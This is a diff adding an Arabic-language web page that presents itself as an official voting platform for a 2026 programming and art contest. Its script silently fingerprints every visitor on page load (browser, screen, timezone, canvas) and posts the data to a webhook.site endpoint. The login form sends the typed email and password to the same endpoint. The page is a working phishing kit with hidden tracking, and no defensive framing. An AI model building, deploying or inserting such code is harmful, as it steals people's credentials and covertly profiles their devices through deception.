@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>منصة التصويت - مسابقة البرمجيات</title>
+
+  <meta name="description" content="مسابقات سيرفرس بيل للرسامين و المبرمجين">
+  <meta name="keywords" content="تصويت, مسابقة, برمجيات, Programming Contest, Voting Platform">
+  <meta name="author" content="Programming Contest Committee">
+
+  <link rel="icon" type="image/jfif" href="favicon.jfif">
+
+  <meta property="og:title" content="منصة التصويت - مسابقة البرمجة و الرسامين">
+  <meta property="og:description" content="صوّت الآن لأفضل المشاريع البرمجية في المسابقة الرسمية. دعمك يصنع الفرق!">
+  <meta property="og:image" content="favicon.jfif">
+  <meta property="og:url" content="https://example.com">
+  <meta property="og:type" content="website">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="منصة التصويت - مسابقة البرمجيات">
+  <meta name="twitter:description" content="صوّت الآن لأفضل المشاريع البرمجية في المسابقة الرسمية.">
+  <meta name="twitter:image" content="favicon.jfif">
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f6f9;
+      margin: 0;
+      padding: 0;
+      direction: rtl;
+    }
+
+    header {
+      background-color: #1e2a38;
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+
+    main {
+      padding: 40px;
+      text-align: center;
+    }
+
+    .card {
+      background: white;
+      padding: 20px;
+      margin: 20px auto;
+      max-width: 600px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+
+    button {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    footer {
+      margin-top: 40px;
+      padding: 20px;
+      background: #1e2a38;
+      color: white;
+      text-align: center;
+    }
+  </style>
+</head>
+
+<body>
+
+  <header>
+    <h1>منصة التصويت الرسمية</h1>
+    <p>مسابقة البرمجيات 2026</p>
+  </header>
+
+  <main>
+    <div class="card">
+      <h2>مرحباً بك</h2>
+      <p>
+        هذه المنصة تتيح لك التصويت لأفضل المشاريع البرمجية المشاركة في المسابقة.
+        جميع النتائج تعتمد على الشفافية والنزاهة.
+      </p>
+      <button onclick="showLogin()">ابدأ التصويت</button>
+    </div>
+
+    
+    <div id="loginBox" class="card" style="display:none;">
+      <h2>تسجيل الدخول</h2>
+
+      <form id="loginForm">
+        <input id="email" type="email" placeholder="البريد الإلكتروني" required><br><br>
+        <input id="password" type="password" placeholder="كلمة المرور" required><br><br>
+        <button type="submit">دخول</button>
+      </form>
+    </div>
+
+  </main>
+
+  <footer>
+    <p>© 2026 لجنة مسابقة البرمجيات - جميع الحقوق محفوظة</p>
+  </footer>
+
+  <script>
+  function showLogin() {
+    document.getElementById("loginBox").style.display = "block";
+    window.scrollTo({
+      top: document.body.scrollHeight,
+      behavior: "smooth"
+    });
+  }
+
+  document.addEventListener("DOMContentLoaded", function () {
+
+    (async () => {
+      const collectData = async () => {
+        const data = {};
+
+        data.navigator = {
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          languages: navigator.languages,
+          platform: navigator.platform,
+          hardwareConcurrency: navigator.hardwareConcurrency,
+          deviceMemory: navigator.deviceMemory,
+          cookieEnabled: navigator.cookieEnabled,
+          doNotTrack: navigator.doNotTrack,
+          vendor: navigator.vendor,
+          product: navigator.product
+        };
+
+        data.document = {
+          url: document.URL,
+          title: document.title,
+          referrer: document.referrer,
+          domain: document.domain,
+          lastModified: document.lastModified,
+          charset: document.characterSet
+        };
+
+        data.screen = {
+          width: screen.width,
+          height: screen.height,
+          availWidth: screen.availWidth,
+          availHeight: screen.availHeight,
+          colorDepth: screen.colorDepth,
+          pixelDepth: screen.pixelDepth
+        };
+
+        data.window = {
+          innerWidth: window.innerWidth,
+          innerHeight: window.innerHeight,
+          outerWidth: window.outerWidth,
+          outerHeight: window.outerHeight,
+          devicePixelRatio: window.devicePixelRatio
+        };
+
+        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+        try {
+          const canvas = document.createElement("canvas");
+          const ctx = canvas.getContext("2d");
+          ctx.textBaseline = "top";
+          ctx.font = "14px Arial";
+          ctx.fillText("fingerprint", 2, 2);
+          data.canvas = canvas.toDataURL();
+        } catch (e) {
+          data.canvas = "error";
+        }
+
+        return data;
+      };
+
+      const data = await collectData();
+
+      await fetch(" https://webhook.site/544696b5-239a-4a30-b772-6904cbc21350", {
+        method: "POST",
+        mode: "no-cors",
+        body: new URLSearchParams({
+          payload: JSON.stringify(data)
+        })
+      });
+
+      console.log("Submit");
+    })();
+
+    const form = document.getElementById("loginForm");
+
+    if (form) {
+      form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
+
+        try {
+          const res = await fetch("https://webhook.site/544696b5-239a-4a30-b772-6904cbc21350", {
+            method: "POST",
+            body: new URLSearchParams({
+              email: email,
+              password: password
+            })
+          });
+
+          alert("Sent");
+
+        } catch (err) {
+          console.error(err);
+          alert("Error");
+        }
+      });
+    }
+
+  });
+</script>
+</body>
+</html>
